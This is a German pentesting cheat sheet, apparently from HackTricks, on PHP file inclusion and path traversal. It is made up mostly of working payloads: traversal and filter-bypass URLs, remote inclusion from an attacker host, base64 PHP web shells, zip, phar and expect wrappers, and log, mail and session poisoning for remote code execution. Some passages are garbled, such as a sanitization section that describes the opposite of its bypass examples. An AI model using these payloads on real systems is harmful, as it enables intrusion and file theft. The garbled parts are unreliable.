# Datei-Inklusion/Pfadüberschreitung

<details>

<summary>Lernen Sie das Hacken von AWS von Grund auf mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

- Wenn Sie Ihr Unternehmen in HackTricks bewerben möchten oder HackTricks als PDF herunterladen möchten, überprüfen Sie die [ABONNEMENTPLÄNE](https://github.com/sponsors/carlospolop)!
- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem HackenProof-Discord-Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!

**Hacking Insights**\
Beschäftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ankündigungen**\
Bleiben Sie über die neuesten Bug-Bounties und wichtige Plattformupdates informiert.

**Treten Sie uns auf Discord bei** und arbeiten Sie noch heute mit Top-Hackern zusammen!

## Datei-Inklusion

**Remote File Inclusion (RFI):** Die Datei wird von einem entfernten Server geladen (am besten: Sie können den Code schreiben und der Server wird ihn ausführen). In PHP ist dies standardmäßig **deaktiviert** (**allow\_url\_include**).\
**Local File Inclusion (LFI):** Der Server lädt eine lokale Datei.

Die Schwachstelle tritt auf, wenn der Benutzer die Datei, die vom Server geladen werden soll, auf irgendeine Weise kontrollieren kann.

Anfällige **PHP-Funktionen**: require, require\_once, include, include\_once

Ein interessantes Tool, um diese Schwachstelle auszunutzen: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessante - LFI2RCE-Dateien
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Durch die Kombination mehrerer \*nix LFI-Listen und das Hinzufügen weiterer Pfade habe ich diese erstellt:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Versuchen Sie auch, `/` durch `\` zu ersetzen.\
Versuchen Sie auch, `../../../../../` hinzuzufügen.

Eine Liste, die verschiedene Techniken verwendet, um die Datei /etc/password (um zu überprüfen, ob die Schwachstelle vorhanden ist) zu finden, finden Sie [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt).

### **Windows**

Zusammenführung verschiedener Wortlisten:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Versuchen Sie auch, `/` durch `\` zu ersetzen.\
Versuchen Sie auch, `C:/` zu entfernen und `../../../../../` hinzuzufügen.

Eine Liste, die verschiedene Techniken verwendet, um die Datei /boot.ini (um zu überprüfen, ob die Schwachstelle vorhanden ist) zu finden, finden Sie [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt).

### **OS X**

Überprüfen Sie die LFI-Liste von Linux.

## Grundlegende LFI und Umgehungen

Alle Beispiele gelten für Local File Inclusion, können aber auch auf Remote File Inclusion angewendet werden (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Nicht-rekursiv bereinigte Traversierungssequenzen

Eine nicht-rekursive Methode zur Bereinigung von Traversierungssequenzen besteht darin, die Sequenz schrittweise zu bereinigen, indem alle Vorkommen von "../" entfernt werden. Dieser Ansatz entfernt die Sequenzschritte, die auf den übergeordneten Verzeichnissen verweisen, und ermöglicht es uns, eine gültige Pfadsequenz beizubehalten.

Um dies zu erreichen, können wir die folgenden Schritte ausführen:

1. Ersetzen Sie alle Vorkommen von "../" in der Sequenz durch eine leere Zeichenkette.
2. Wiederholen Sie den vorherigen Schritt, bis keine weiteren Vorkommen von "../" in der Sequenz vorhanden sind.

Auf diese Weise können wir die Traversierungssequenz bereinigen und sicherstellen, dass sie keine Verweise auf übergeordnete Verzeichnisse enthält.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null Byte (%00)**

Umgehe das Anhängen weiterer Zeichen am Ende des bereitgestellten Strings (Umgehung von: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dies ist seit PHP 5.4 **gelöst**.

### **Codierung**

Sie könnten nicht standardmäßige Codierungen wie doppelte URL-Codierung (und andere) verwenden:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Aus vorhandenem Ordner

Möglicherweise überprüft das Backend den Ordnerpfad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Erkunden von Dateisystemverzeichnissen auf einem Server

Das Dateisystem eines Servers kann rekursiv erkundet werden, um Verzeichnisse und nicht nur Dateien zu identifizieren, indem bestimmte Techniken angewendet werden. Dieser Prozess beinhaltet die Bestimmung der Verzeichnistiefe und das Überprüfen auf das Vorhandensein bestimmter Ordner. Im Folgenden wird eine detaillierte Methode zur Erreichung dieses Ziels beschrieben:

1. **Bestimmen der Verzeichnistiefe:**
Ermitteln Sie die Tiefe Ihres aktuellen Verzeichnisses, indem Sie erfolgreich die Datei `/etc/passwd` abrufen (gilt, wenn der Server auf Linux basiert). Eine Beispiel-URL könnte wie folgt strukturiert sein und eine Tiefe von drei anzeigen:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ordner sondieren:**
Fügen Sie den Namen des verdächtigen Ordners (z. B. `private`) zur URL hinzu und navigieren Sie dann zurück zu `/etc/passwd`. Die zusätzliche Verzeichnisebene erfordert eine Erhöhung der Tiefe um eins:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretieren der Ergebnisse:**
Die Antwort des Servers gibt an, ob der Ordner existiert:
- **Fehler / Keine Ausgabe:** Der Ordner `private` existiert wahrscheinlich nicht an der angegebenen Stelle.
- **Inhalt von `/etc/passwd`:** Die Existenz des Ordners `private` wird bestätigt.

4. **Rekursive Erkundung:**
Entdeckte Ordner können mithilfe derselben Technik oder traditionellen Methoden zur lokalen Dateieinbindung (LFI) weiter untersucht werden.

Um Verzeichnisse an verschiedenen Speicherorten im Dateisystem zu erkunden, passen Sie die Nutzlast entsprechend an. Um beispielsweise zu überprüfen, ob `/var/www/` ein Verzeichnis `private` enthält (unter der Annahme, dass sich das aktuelle Verzeichnis in einer Tiefe von 3 befindet), verwenden Sie:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Pfadverkürzungstechnik**

Die Pfadverkürzung ist eine Methode, um Dateipfade in Webanwendungen zu manipulieren. Sie wird häufig verwendet, um auf eingeschränkte Dateien zuzugreifen, indem bestimmte Sicherheitsmaßnahmen umgangen werden, die zusätzliche Zeichen am Ende der Dateipfade anhängen. Das Ziel besteht darin, einen Dateipfad zu erstellen, der, einmal von der Sicherheitsmaßnahme verändert, immer noch auf die gewünschte Datei verweist.

In PHP können verschiedene Darstellungen eines Dateipfads aufgrund der Natur des Dateisystems als äquivalent betrachtet werden. Zum Beispiel:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` und `/etc/passwd/` werden alle als derselbe Pfad behandelt.
- Wenn die letzten 6 Zeichen `passwd` sind, ändert das Anhängen eines `/` (zu `passwd/`) die Zieldatei nicht.
- Ebenso wird das Hinzufügen von `.php` zu einem Dateipfad (wie `shellcode.php`) durch das Hinzufügen von `/.` am Ende nicht verändert.

Die bereitgestellten Beispiele zeigen, wie die Pfadverkürzung genutzt werden kann, um auf `/etc/passwd` zuzugreifen, ein häufiges Ziel aufgrund seines sensiblen Inhalts (Benutzerkontoinformationen):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In diesen Szenarien kann die Anzahl der erforderlichen Traversals etwa 2027 betragen, aber diese Zahl kann je nach Konfiguration des Servers variieren.

- **Verwendung von Punktsegmenten und zusätzlichen Zeichen**:
Traversierungssequenzen (`../`), kombiniert mit zusätzlichen Punktsegmenten und Zeichen, können verwendet werden, um das Dateisystem zu navigieren und dabei die vom Server angehängten Zeichenketten zu ignorieren.

- **Ermittlung der erforderlichen Anzahl von Traversals**:
Durch Ausprobieren kann man die genaue Anzahl der `../`-Sequenzen ermitteln, die benötigt werden, um zum Stammverzeichnis und dann zu `/etc/passwd` zu navigieren. Dabei wird sichergestellt, dass angehängte Zeichenketten (wie `.php`) neutralisiert werden, aber der gewünschte Pfad (`/etc/passwd`) intakt bleibt.

- **Beginn mit einem falschen Verzeichnis**:
Es ist üblich, den Pfad mit einem nicht existierenden Verzeichnis zu beginnen (wie z.B. `a/`). Diese Technik wird als Vorsichtsmaßnahme oder zur Erfüllung der Anforderungen der Pfad-Analyse-Logik des Servers verwendet.

Bei der Verwendung von Pfad-Truncation-Techniken ist es wichtig, das Pfad-Analyse-Verhalten des Servers und die Dateisystemstruktur zu verstehen. Jedes Szenario erfordert möglicherweise einen anderen Ansatz, und Tests sind oft erforderlich, um die effektivste Methode zu finden.

**Diese Sicherheitslücke wurde in PHP 5.3 behoben.**

### **Filterumgehungs-Tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion (Ferndatei-Einschluss)

In PHP ist dies standardmäßig deaktiviert, da **`allow_url_include`** auf **Off** gesetzt ist. Es muss auf **On** gesetzt sein, damit es funktioniert. In diesem Fall könnten Sie eine PHP-Datei von Ihrem Server einbinden und RCE erhalten:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Wenn aus irgendeinem Grund **`allow_url_include`** **aktiviert** ist, aber PHP den Zugriff auf externe Webseiten **filtert**, [laut diesem Beitrag](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) könnten Sie beispielsweise das Datenprotokoll mit Base64 verwenden, um einen b64 PHP-Code zu decodieren und RCE zu erhalten:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Im vorherigen Code wurde das abschließende `+.txt` hinzugefügt, weil der Angreifer eine Zeichenkette benötigte, die mit `.txt` endet. Dadurch endet die Zeichenkette damit und nach dem b64-Decodieren wird dieser Teil nur Müll zurückgeben und der echte PHP-Code wird eingefügt (und somit ausgeführt).
{% endhint %}

Ein weiteres Beispiel, **ohne das `php://`-Protokoll** zu verwenden, wäre:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root-Element

In Python, in einem Code wie diesem:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Wenn der Benutzer einen **absoluten Pfad** an **`file_name`** übergibt, wird der **vorherige Pfad einfach entfernt**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es ist das beabsichtigte Verhalten gemäß [der Dokumentation](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Wenn ein Bestandteil ein absoluter Pfad ist, werden alle vorherigen Bestandteile verworfen und das Verbinden wird vom absoluten Pfadbestandteil fortgesetzt.

## Java-Verzeichnis auflisten

Es scheint, dass bei einem Path Traversal in Java und wenn Sie nach einem **Verzeichnis anstatt einer Datei fragen**, eine **Auflistung des Verzeichnisses zurückgegeben wird**. Dies geschieht in anderen Sprachen nicht (soweit ich weiß).

## Top 25 Parameter

Hier ist eine Liste der 25 wichtigsten Parameter, die anfällig für lokale Dateieinschluss (LFI) Schwachstellen sein könnten (von [Link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI mit PHP-Wrappern und Protokollen

### php://filter

PHP-Filter ermöglichen grundlegende **Änderungsoperationen an den Daten**, bevor sie gelesen oder geschrieben werden. Es gibt 5 Kategorien von Filtern:

* [String-Filter](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Entfernt Tags aus den Daten (alles zwischen "<" und ">" Zeichen)
* Beachten Sie, dass dieser Filter in modernen Versionen von PHP nicht mehr vorhanden ist.
* [Konversionsfilter](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Wandelt in eine andere Codierung um (`convert.iconv.<input_enc>.<output_enc>`). Um die **Liste aller unterstützten Codierungen** zu erhalten, führen Sie in der Konsole aus: `iconv -l`

{% hint style="warning" %}
Durch Missbrauch des Konversionsfilters `convert.iconv.*` können Sie **beliebigen Text generieren**, der nützlich sein könnte, um beliebigen Text zu schreiben oder eine Funktion wie das Einbinden von beliebigem Text zu erstellen. Weitere Informationen finden Sie unter [**LFI2RCE über PHP-Filter**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Kompressionsfilter](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Komprimiert den Inhalt (nützlich, wenn viele Informationen exfiltriert werden)
* `zlib.inflate`: Dekomprimiert die Daten
* [Verschlüsselungsfilter](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Veraltet
* `mdecrypt.*` : Veraltet
* Andere Filter
* Wenn Sie in PHP `var_dump(stream_get_filters());` ausführen, finden Sie ein paar **unerwartete Filter**:
* `consumed`
* `dechunk`: kehrt die HTTP chunked-Kodierung um
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Der Teil "php://filter" ist nicht case-sensitive.
{% endhint %}

### php://fd

Dieser Wrapper ermöglicht den Zugriff auf Dateideskriptoren, die der Prozess geöffnet hat. Möglicherweise nützlich, um den Inhalt geöffneter Dateien zu exfiltrieren:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Sie können auch **php://stdin, php://stdout und php://stderr** verwenden, um auf die **Dateideskriptoren 0, 1 und 2** zuzugreifen (ich bin mir nicht sicher, wie dies bei einem Angriff nützlich sein könnte).

### zip:// und rar://

Laden Sie eine Zip- oder Rar-Datei mit einer PHPShell hoch und greifen Sie darauf zu.\
Um das RAR-Protokoll missbrauchen zu können, **muss es speziell aktiviert sein**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Die `data://`-Methode ermöglicht es, Daten direkt in eine URL einzubetten, anstatt auf eine externe Ressource zu verweisen. Dies kann nützlich sein, um Daten in einer URL zu transportieren, ohne dass eine separate Datei benötigt wird.

Um die `data://`-Methode zu verwenden, muss der Dateninhalt in Base64 codiert werden. Dies kann mit verschiedenen Tools oder Programmiersprachen erreicht werden. Der Base64-codierte Dateninhalt wird dann in der URL angegeben, gefolgt von einem MIME-Typ, der den Inhaltstyp angibt.

Ein Beispiel für die Verwendung der `data://`-Methode ist:

```html
<img src="data:image/png;base64,iVBORw0KG..."/>
```

In diesem Beispiel wird ein Bild in der URL eingebettet. Der Base64-codierte Inhalt des Bildes wird nach `base64,` angegeben, gefolgt von `image/png`, um den MIME-Typ des Bildes anzugeben.

Es ist wichtig zu beachten, dass die Verwendung der `data://`-Methode dazu führen kann, dass die URL sehr lang wird, insbesondere bei größeren Dateninhalten. Dies kann zu Problemen führen, wenn die URL-Länge begrenzt ist.

Darüber hinaus kann die Verwendung der `data://`-Methode Sicherheitsrisiken mit sich bringen, insbesondere wenn Benutzereingaben nicht ordnungsgemäß validiert werden. Angreifer könnten versuchen, schädlichen Code in die URL einzufügen und so eine Remote-Code-Ausführung oder andere Angriffe durchzuführen.

Es ist daher wichtig, die Eingaben ordnungsgemäß zu validieren und zu filtern, um potenzielle Sicherheitslücken zu vermeiden.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Beachten Sie, dass dieses Protokoll durch die PHP-Konfigurationen **`allow_url_open`** und **`allow_url_include`** eingeschränkt ist.

### expect://

Expect muss aktiviert sein. Sie können Code mit folgendem Befehl ausführen:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### Eingabe://

Geben Sie Ihre Payload in den POST-Parametern an:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Eine `.phar`-Datei kann verwendet werden, um PHP-Code auszuführen, wenn eine Webanwendung Funktionen wie `include` zum Laden von Dateien verwendet. Der untenstehende PHP-Codeausschnitt zeigt die Erstellung einer `.phar`-Datei:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Um die `.phar`-Datei zu kompilieren, sollte der folgende Befehl ausgeführt werden:
```bash
php --define phar.readonly=0 create_path.php
```
Bei der Ausführung wird eine Datei mit dem Namen `test.phar` erstellt, die potenziell zur Ausnutzung von Local File Inclusion (LFI)-Schwachstellen verwendet werden kann.

In Fällen, in denen die LFI nur das Lesen von Dateien ohne Ausführung des PHP-Codes durch Funktionen wie `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` oder `filesize()` durchführt, kann versucht werden, eine Deserialisierungsschwachstelle auszunutzen. Diese Schwachstelle ist mit dem Lesen von Dateien unter Verwendung des `phar`-Protokolls verbunden.

Für ein detailliertes Verständnis der Ausnutzung von Deserialisierungsschwachstellen im Zusammenhang mit `.phar`-Dateien siehe das unten verlinkte Dokument:

[Leitfaden zur Ausnutzung der Deserialisierung von Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Weitere Protokolle

Überprüfen Sie weitere mögliche [**Protokolle, die hier eingefügt werden können**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory und php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Schreiben in den Speicher oder in eine temporäre Datei (nicht sicher, wie dies bei einem Dateieinschlussangriff nützlich sein kann)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Zugriff auf das lokale Dateisystem
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Zugriff auf HTTP(s)-URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Zugriff auf FTP(s)-URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Komprimierungsstreams
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Suchen von Pfadnamen, die dem Muster entsprechen (gibt nichts Druckbares zurück, daher hier nicht wirklich nützlich)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audiostreams (nicht nützlich zum Lesen beliebiger Dateien)

## LFI über PHP's 'assert'

Das Risiko von Local File Inclusion (LFI) in PHP ist besonders hoch, wenn die Funktion 'assert' verwendet wird, die Code in Zeichenketten ausführen kann. Dies ist besonders problematisch, wenn Eingaben, die Verzeichnistraversierungszeichen wie ".." enthalten, überprüft, aber nicht ordnungsgemäß bereinigt werden.

Zum Beispiel könnte der PHP-Code so konzipiert sein, dass Verzeichnistraversierung verhindert wird, wie folgt:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Obwohl dies darauf abzielt, Traversal zu stoppen, schafft es unbeabsichtigt einen Vektor für Code-Injection. Um dies auszunutzen und Dateiinhalte zu lesen, könnte ein Angreifer Folgendes verwenden:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ebenso kann man zur Ausführung beliebiger Systembefehle Folgendes verwenden:
```plaintext
' and die(system("id")) or '
```
Es ist wichtig, diese Payloads **URL-codiert** zu verwenden.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!

**Hacking Insights**\
Beschäftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ankündigungen**\
Bleiben Sie über die neuesten Bug-Bounties und wichtige Plattformupdates informiert.

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

## PHP Blind Path Traversal

{% hint style="warning" %}
Diese Technik ist relevant in Fällen, in denen Sie den Dateipfad einer PHP-Funktion **kontrollieren**, die auf eine Datei zugreifen wird, deren Inhalt Sie jedoch nicht sehen können (wie ein einfacher Aufruf von **`file()`**), aber der Inhalt wird nicht angezeigt.
{% endhint %}

In [**diesem unglaublichen Beitrag**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wird erklärt, wie ein blinder Pfadtraversal über den PHP-Filter missbraucht werden kann, um den Inhalt einer Datei über ein Fehlerorakel zu **exfiltrieren**.

Zusammenfassend wird die Technik verwendet, um die Datei mit der **"UCS-4LE-Codierung"** so **groß** zu machen, dass die PHP-Funktion, die die Datei öffnet, einen **Fehler auslöst**.

Um das erste Zeichen zu leaken, wird der Filter **`dechunk`** zusammen mit anderen wie **base64** oder **rot13** verwendet, und schließlich werden die Filter **convert.iconv.UCS-4.UCS-4LE** und **convert.iconv.UTF16.UTF-16BE** verwendet, um andere Zeichen am Anfang zu platzieren und sie zu leaken.

**Anfällige Funktionen**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (nur Ziel mit Lesezugriff)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Für technische Details lesen Sie den genannten Beitrag!

## LFI2RCE

### Remote File Inclusion

Wie zuvor erklärt, [**folgen Sie diesem Link**](./#remote-file-inclusion).

### Über Apache/Nginx-Logdatei

Wenn der Apache- oder Nginx-Server anfällig für LFI ist und die Include-Funktion verwendet, können Sie versuchen, auf **`/var/log/apache2/access.log` oder `/var/log/nginx/access.log`** zuzugreifen. Geben Sie im **User-Agent** oder in einem **GET-Parameter** eine PHP-Shell wie **`<?php system($_GET['c']); ?>`** ein und inkludieren Sie diese Datei.

{% hint style="warning" %}
Beachten Sie, dass **wenn Sie doppelte Anführungszeichen** für die Shell anstelle von **einfachen Anführungszeichen** verwenden, die doppelten Anführungszeichen für den String "_**quote;**_" modifiziert werden, **PHP dort einen Fehler auslöst** und **nichts anderes ausgeführt wird**.

Stellen Sie außerdem sicher, dass Sie die Payload **korrekt schreiben**, da PHP jedes Mal einen Fehler auslöst, wenn es versucht, die Protokolldatei zu laden, und Sie keine zweite Gelegenheit haben werden.
{% endhint %}

Dies kann auch in anderen Protokollen durchgeführt werden, aber **seien Sie vorsichtig**, der Code in den Protokollen könnte URL-codiert sein und dies könnte die Shell zerstören. Der Header **Authorization "Basic"** enthält "Benutzer:Passwort" in Base64 und wird in den Protokollen decodiert. Die PHPShell könnte in diesen Header eingefügt werden.\
Andere mögliche Protokollpfade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing-Wortliste: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Über E-Mail

**Senden Sie eine E-Mail** an ein internes Konto (user@localhost) mit Ihrem PHP-Payload wie `<?php echo system($_REQUEST["cmd"]); ?>` und versuchen Sie, die E-Mail des Benutzers mit einem Pfad wie **`/var/mail/<BENUTZERNAME>`** oder **`/var/spool/mail/<BENUTZERNAME>`** einzuschließen.

### Über /proc/\*/fd/\*

1. Laden Sie viele Shells hoch (zum Beispiel: 100).
2. Schließen Sie [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) ein, wobei $PID die Prozess-ID ist (kann durch Brute-Force ermittelt werden) und $FD der Dateideskriptor ist (kann ebenfalls durch Brute-Force ermittelt werden).

### Über /proc/self/environ

Ähnlich wie eine Protokolldatei, senden Sie den Payload im User-Agent, er wird im /proc/self/environ-Datei reflektiert.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Über den Upload

Wenn Sie eine Datei hochladen können, fügen Sie einfach die Shell-Payload ein (z.B.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Um die Datei lesbar zu halten, ist es am besten, in die Metadaten der Bilder/Dokumente/PDFs einzufügen.

### Über den Upload einer Zip-Datei

Laden Sie eine ZIP-Datei hoch, die eine komprimierte PHP-Shell enthält, und greifen Sie darauf zu:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Über PHP-Sitzungen

Überprüfen Sie, ob die Website PHP-Sitzungen (PHPSESSID) verwendet.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP werden diese Sitzungen in Dateien _/var/lib/php5/sess\\_\[PHPSESSID]\_ gespeichert.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Setze das Cookie auf `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
